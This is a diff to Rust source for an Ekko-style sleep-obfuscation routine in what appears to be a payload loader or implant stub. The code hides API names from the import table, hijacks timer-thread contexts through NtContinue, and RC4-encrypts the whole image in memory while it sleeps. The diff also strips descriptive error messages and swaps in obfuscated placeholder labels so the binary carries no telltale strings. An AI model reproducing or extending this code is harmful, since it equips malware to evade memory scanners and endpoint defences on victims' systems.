@@ -73,42 +73,21 @@ type FnSetEvent = unsafe extern "system" fn(isize) -> i32;
 type FnVirtualProtect = unsafe extern "system" fn(*const c_void, usize, u32, *mut u32) -> i32;
 
 /// `NTSTATUS NtContinue(PCONTEXT, BOOLEAN)`.
-type FnNtContinue = unsafe extern "system" fn(*const AlignedContext, u8) -> i32;
+type FnContinue = unsafe extern "system" fn(*const AlignedContext, u8) -> i32;
 
 /// `VOID RtlCaptureContext(PCONTEXT)`.
-type FnRtlCaptureContext = unsafe extern "system" fn(*mut AlignedContext);
+type FnCaptureContext = unsafe extern "system" fn(*mut AlignedContext);
 
 /// `NTSTATUS SystemFunction032(struct USTRING*, struct USTRING*)`.
-type FnSystemFunction032 = unsafe extern "system" fn(*const UString, *const UString) -> i32;
+type FnCrypt = unsafe extern "system" fn(*const UString, *const UString) -> i32;
 
-/// Errors produced while running an obfuscated sleep.
+/// Appends a Win32 error code to a label.
 ///
-/// The variants that report a Win32 error code carry `GetLastError()` (or the
-/// wait status) as their payload. `CryptFunctionFailed` is reserved: in this
-/// variant the RC4 call runs on a hijacked timer thread whose NTSTATUS is not
-/// observable from the calling thread, so the variant is not constructed here
-/// (the direct-call variants will use it).
-#[derive(Debug, thiserror::Error)]
-pub enum SleepObfuscationError {
-    #[error("could not capture a timer-thread context (code 0x{0:08x})")]
-    CaptureContextFailed(u32),
-    #[error("could not create the timer queue (code 0x{0:08x})")]
-    CreateTimerQueueFailed(u32),
-    #[error("could not queue a timer (code 0x{0:08x})")]
-    CreateTimerQueueTimerFailed(u32),
-    #[error("could not walk the image memory (code 0x{0:08x})")]
-    VirtualQueryFailed(u32),
-    #[error("could not change the image memory protection (code 0x{0:08x})")]
-    VirtualProtectFailed(u32),
-    #[error("could not resolve the RC4 system function")]
-    CryptFunctionNotFound,
-    /// The RC4 call itself runs on a hijacked timer thread whose NTSTATUS is
-    /// not observable here, so this variant only reports the key-derivation
-    /// failure; the direct-call variants will also surface the RC4 status.
-    #[error("the RC4 system function failed (0x{0:08x})")]
-    CryptFunctionFailed(u32),
-    #[error("no committed region of the image to encrypt")]
-    NoTargetRegions,
+/// The label is rebuilt from obfuscated bytes at the call site, so this format
+/// string carries no diagnostic text. A call site with no error to report
+/// passes `0` (the code is then just noise).
+fn step_error(label: String, code: u32) -> String {
+    format!("{label} (code 0x{code:08x})")
 }
 
 /// `NtContinue` reads the whole x64 `CONTEXT`; the `windows` binding exposes it
@@ -153,11 +132,7 @@ impl UString {
 /// `name` is a runtime-rebuilt string (`StringsConfig`), so it never appears
 /// in the binary's cleartext. The transmute only fixes the signature; both
 /// sides are function pointers of the same size.
-fn resolve_as<T>(
-    module: HMODULE,
-    name: &str,
-    on_missing: SleepObfuscationError,
-) -> Result<T, SleepObfuscationError> {
+fn resolve_as<T>(module: HMODULE, name: &str, on_missing: String) -> Result<T, String> {
     let cname = match std::ffi::CString::new(name) {
         Ok(c) => c,
         Err(_) => return Err(on_missing),
@@ -190,7 +165,7 @@ fn queue_timer(
     callback: TimerCallback,
     context: &AlignedContext,
     due_ms: u32,
-) -> Result<(), SleepObfuscationError> {
+) -> Result<(), String> {
     let mut timer = 0isize;
     let ok = unsafe {
         create_timer_queue_timer(
@@ -204,7 +179,7 @@ fn queue_timer(
         )
     };
     if ok == 0 {
-        return Err(SleepObfuscationError::CreateTimerQueueTimerFailed(unsafe {
+        return Err(step_error($MSG_CREATE_TIMER_QUEUE_TIMER_FAILED$, unsafe {
             GetLastError().0
         }));
     }
@@ -248,35 +223,35 @@ fn rop_context(
 ///
 /// This is the demo form (timing option C): it performs one encrypted sleep
 /// and returns, then the Execution technique runs the payload normally.
-pub fn sleep_obfuscation() -> Result<bool, SleepObfuscationError> {
+pub fn sleep_obfuscation() -> Result<bool, String> {
     // 1. Resolve the libraries and every dynamic entry point. Names are
     //    runtime-rebuilt strings, so none of them reaches the import table.
     let kernel32_name = std::ffi::CString::new($KERNEL32_DLL_DEF$)
-        .map_err(|_| SleepObfuscationError::CreateTimerQueueFailed(0))?;
+        .map_err(|_| step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, 0))?;
     let kernel32 = unsafe { GetModuleHandleA(PCSTR(kernel32_name.as_ptr() as *const u8)) }
-        .map_err(|_| SleepObfuscationError::CreateTimerQueueFailed(0))?;
+        .map_err(|_| step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, 0))?;
 
     let ntdll_name = std::ffi::CString::new($NTDLL_DLL_DEF$)
-        .map_err(|_| SleepObfuscationError::CaptureContextFailed(0))?;
+        .map_err(|_| step_error($MSG_CAPTURE_CONTEXT_FAILED$, 0))?;
     let ntdll = unsafe { GetModuleHandleA(PCSTR(ntdll_name.as_ptr() as *const u8)) }
-        .map_err(|_| SleepObfuscationError::CaptureContextFailed(0))?;
+        .map_err(|_| step_error($MSG_CAPTURE_CONTEXT_FAILED$, 0))?;
 
     let advapi32_name = std::ffi::CString::new($ADVAPI32_DLL_DEF$)
-        .map_err(|_| SleepObfuscationError::CryptFunctionNotFound)?;
+        .map_err(|_| $MSG_CRYPT_FUNCTION_NOT_FOUND$)?;
     let advapi32 = unsafe { LoadLibraryA(PCSTR(advapi32_name.as_ptr() as *const u8)) }
-        .map_err(|_| SleepObfuscationError::CryptFunctionNotFound)?;
+        .map_err(|_| $MSG_CRYPT_FUNCTION_NOT_FOUND$)?;
 
-    // Resolution failures reuse the closest error variant with code 0; these
+    // Resolution failures reuse the closest error label with code 0; these
     // paths are unreachable in practice (kernel32/ntdll always export them).
     let create_timer_queue: FnCreateTimerQueue = resolve_as(
         kernel32,
         &$CREATE_TIMER_QUEUE_DEF$,
-        SleepObfuscationError::CreateTimerQueueFailed(0),
+        step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, 0),
     )?;
     let create_timer_queue_timer: FnCreateTimerQueueTimer = resolve_as(
         kernel32,
         &$CREATE_TIMER_QUEUE_TIMER_DEF$,
-        SleepObfuscationError::CreateTimerQueueTimerFailed(0),
+        step_error($MSG_CREATE_TIMER_QUEUE_TIMER_FAILED$, 0),
     )?;
     let delete_timer_queue_ex: Option<FnDeleteTimerQueueEx> =
         resolve_address(kernel32, &$DELETE_TIMER_QUEUE_EX_DEF$)
@@ -284,39 +259,39 @@ pub fn sleep_obfuscation() -> Result<bool, SleepObfuscationError> {
     let wait_for_single_object: FnWaitForSingleObject = resolve_as(
         kernel32,
         &$WAIT_FOR_SINGLE_OBJECT_DEF$,
-        SleepObfuscationError::CaptureContextFailed(0),
+        step_error($MSG_CAPTURE_CONTEXT_FAILED$, 0),
     )?;
     let set_event: FnSetEvent = resolve_as(
         kernel32,
         &$SET_EVENT_DEF$,
-        SleepObfuscationError::CreateTimerQueueTimerFailed(0),
+        step_error($MSG_CREATE_TIMER_QUEUE_TIMER_FAILED$, 0),
     )?;
     let virtual_protect: FnVirtualProtect = resolve_as(
         kernel32,
         &$VIRTUAL_PROTECT_DEF$,
-        SleepObfuscationError::VirtualProtectFailed(0),
+        step_error($MSG_VIRTUAL_PROTECT_FAILED$, 0),
     )?;
-    let rtl_capture_context: FnRtlCaptureContext = resolve_as(
+    let rtl_capture_context: FnCaptureContext = resolve_as(
         ntdll,
         &$RTL_CAPTURE_CONTEXT_DEF$,
-        SleepObfuscationError::CaptureContextFailed(0),
+        step_error($MSG_CAPTURE_CONTEXT_FAILED$, 0),
     )?;
-    let nt_continue: FnNtContinue = resolve_as(
+    let nt_continue: FnContinue = resolve_as(
         ntdll,
         &$NT_CONTINUE_DEF$,
-        SleepObfuscationError::CaptureContextFailed(0),
+        step_error($MSG_CAPTURE_CONTEXT_FAILED$, 0),
     )?;
-    let system_function_032: FnSystemFunction032 = resolve_as(
+    let system_function_032: FnCrypt = resolve_as(
         advapi32,
         &$SYSTEM_FUNCTION_032_DEF$,
-        SleepObfuscationError::CryptFunctionNotFound,
+        $MSG_CRYPT_FUNCTION_NOT_FOUND$,
     )?;
 
     // 2. Locate the image region to encrypt: the whole stub image
     //    (base + SizeOfImage), as the original Ekko does. The payload lives
     //    inside this image, so covering it also covers the payload.
     let image_base = unsafe { GetModuleHandleA(PCSTR::null()) }
-        .map_err(|_| SleepObfuscationError::NoTargetRegions)?
+        .map_err(|_| $MSG_NO_TARGET_REGIONS$)?
         .0 as usize;
     let image_size = {
         let dos = image_base as *const IMAGE_DOS_HEADER;
@@ -324,7 +299,7 @@ pub fn sleep_obfuscation() -> Result<bool, SleepObfuscationError> {
         unsafe { (*nt).OptionalHeader.SizeOfImage as usize }
     };
     if image_size == 0 {
-        return Err(SleepObfuscationError::NoTargetRegions);
+        return Err($MSG_NO_TARGET_REGIONS$);
     }
 
     // 3. Walk the image with VirtualQuery and keep every committed run
@@ -343,11 +318,14 @@ pub fn sleep_obfuscation() -> Result<bool, SleepObfuscationError> {
     // included — is parked in a wait or in system DLLs.
     let mut old_protect = PAGE_PROTECTION_FLAGS(0);
 
-    let h_event = unsafe { CreateEventW(None, false, false, None) }
-        .map_err(|_| SleepObfuscationError::CreateTimerQueueFailed(unsafe { GetLastError().0 }))?;
+    let h_event = unsafe { CreateEventW(None, false, false, None) }.map_err(|_| {
+        step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, unsafe {
+            GetLastError().0
+        })
+    })?;
     let h_queue = unsafe { create_timer_queue() };
     if h_queue == 0 {
-        return Err(SleepObfuscationError::CreateTimerQueueFailed(unsafe {
+        return Err(step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, unsafe {
             GetLastError().0
         }));
     }
@@ -380,15 +358,15 @@ pub fn sleep_obfuscation() -> Result<bool, SleepObfuscationError> {
         false
     };
     if !capture_ok {
-        return Err(SleepObfuscationError::CaptureContextFailed(WAIT_TIMEOUT));
+        return Err(step_error($MSG_CAPTURE_CONTEXT_FAILED$, WAIT_TIMEOUT));
     }
 
     // 5. Build the continuation contexts. The RC4 key is a fresh per-build key
     //    (the original Ekko hardcodes 0x55); its hex form is rebuilt at runtime
     //    by the injected definition below.
     let sleep_key: String = $SLEEP_KEY_DEF$;
-    let mut key_bytes = hex::decode(&sleep_key[..32])
-        .map_err(|_| SleepObfuscationError::CryptFunctionFailed(0))?;
+    let mut key_bytes =
+        hex::decode(&sleep_key[..32]).map_err(|_| step_error($MSG_CRYPT_FUNCTION_FAILED$, 0))?;
     let key = UString::from_bytes(&mut key_bytes);
 
     let mut chunks: Vec<UString> = Vec::new();
@@ -563,10 +541,7 @@ pub fn sleep_obfuscation() -> Result<bool, SleepObfuscationError> {
 
 /// Walks `[base, base + size)` with `VirtualQuery` and returns every committed
 /// run as `(start, length, protection)`, clamped to the requested range.
-fn walk_image_runs(
-    base: usize,
-    size: usize,
-) -> Result<Vec<(usize, usize, u32)>, SleepObfuscationError> {
+fn walk_image_runs(base: usize, size: usize) -> Result<Vec<(usize, usize, u32)>, String> {
     let mut runs = Vec::new();
     let end = base + size;
     let mut cursor = base;
@@ -580,13 +555,13 @@ fn walk_image_runs(
             )
         };
         if written == 0 {
-            return Err(SleepObfuscationError::VirtualQueryFailed(unsafe {
+            return Err(step_error($MSG_VIRTUAL_QUERY_FAILED$, unsafe {
                 GetLastError().0
             }));
         }
         let region_end = (info.BaseAddress as usize).saturating_add(info.RegionSize);
         if region_end <= cursor {
-            return Err(SleepObfuscationError::VirtualQueryFailed(0));
+            return Err(step_error($MSG_VIRTUAL_QUERY_FAILED$, 0));
         }
         if info.State == MEM_COMMIT {
             let start = cursor.max(info.BaseAddress as usize);
@@ -598,7 +573,7 @@ fn walk_image_runs(
         cursor = region_end;
     }
     if runs.is_empty() {
-        return Err(SleepObfuscationError::NoTargetRegions);
+        return Err($MSG_NO_TARGET_REGIONS$);
     }
     Ok(runs)
 }
